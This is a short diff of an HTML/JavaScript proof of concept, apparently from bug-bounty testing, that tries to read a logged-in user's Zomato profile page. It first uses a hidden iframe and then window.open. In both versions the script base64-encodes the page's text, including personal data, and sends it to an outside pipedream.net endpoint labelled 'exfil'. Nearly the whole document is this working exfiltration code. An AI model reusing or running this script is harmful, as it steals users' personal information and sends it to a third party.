@@ -1,13 +1,15 @@
-<iframe id="piiFrame" src="https://www.zomato.com/webroutes/getPage?page_url=/profile" style="display:none;"></iframe>
 <script>
-    window.onload = function() {
-        setTimeout(function() {
-            try {
-                var content = document.getElementById('piiFrame').contentWindow.document.body.innerText;
-                fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(content));
-            } catch (e) {
-                fetch('https://eomfuajl79ed6za.m.pipedream.net/?error=' + btoa(e.message));
-            }
-        }, 3000); // Wait for load
-    };
+    // 1. Open the PII page
+    var piiWindow = window.open("https://www.zomato.com/webroutes/getPage?page_url=/profile", "_blank");
+    
+    // 2. Try to read it after it loads
+    setTimeout(function() {
+        try {
+            // If the JSON is raw, it's often inside a <pre> or <body>
+            var data = piiWindow.document.body.innerText;
+            fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(data));
+        } catch (e) {
+            fetch('https://eomfuajl79ed6za.m.pipedream.net/?error=' + btoa(e.message));
+        }
+    }, 4000);
 </script>
